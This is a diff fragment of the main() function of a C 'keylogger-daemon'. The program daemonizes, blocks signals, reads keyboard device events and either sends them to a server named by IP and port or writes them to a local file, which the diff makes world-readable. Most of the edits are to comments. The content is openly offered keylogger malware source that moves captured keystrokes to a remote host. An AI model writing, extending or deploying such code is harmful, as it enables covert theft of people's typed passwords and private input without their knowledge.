@@ -25,13 +25,13 @@ int main(int argc, char *argv[])
     if (argc != 4 && argc != 3)
         fprintf(stderr, "Usage: ./keylogger-daemon ip port [0|1] OR ./keylogger-daemon filename [0|1]\n"), exit(EXIT_FAILURE);
 
-    if (daemonize("keylogger-daemon") < 0) /* Convert process to daemon */
+    if (!daemonize("keylogger-daemon")) /* Convert process to daemon */
         syslog(LOG_ERR, "Couldn't start daemon"), exit(EXIT_FAILURE);
 
     is_single_instance = argc == 4 ? atoi(argv[3]) : atoi(argv[2]);
 
     if (is_single_instance)
-        if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running we terminate. We return the lock file descriptor */
+        if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running we terminate. We return the write lock file descriptor */
             exit(EXIT_FAILURE);
 
     if (blockAllSignals() < 0) /* Blocking all signals */
@@ -48,14 +48,14 @@ int main(int argc, char *argv[])
         short port = atoi(argv[2]);
         if ((fd = openConnectionWithServer(ip, port)) < 0) /* Connecting with server */
             syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later: %s", strerror(errno)), exit(EXIT_FAILURE);
-        unblockSignal(SIGPIPE); /* If server closed connection we terminate daemon */
+        unblockSignal(SIGPIPE); /* If server closes connection and keylogger tries to send events, SIGPIPE is generated */
     }
     else if (file_out_type == FILE) /* If user decided to save events locally */
     {
         char *file_out_path = argv[1];
-        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR)) < 0)
+        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH)) < 0)
             syslog(LOG_ERR, "Couldn't open file %s: %s", argv[2], strerror(errno)), exit(EXIT_FAILURE);
-        unblockSignal(SIGTERM); /* We can terminate daemon only by sending SIGTERM or SIGKILL/SIGSTOP(not adviced) */
+        unblockSignal(SIGTERM); /* We can terminate safely daemon only by sending SIGTERM */
     }
 
     startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to file */
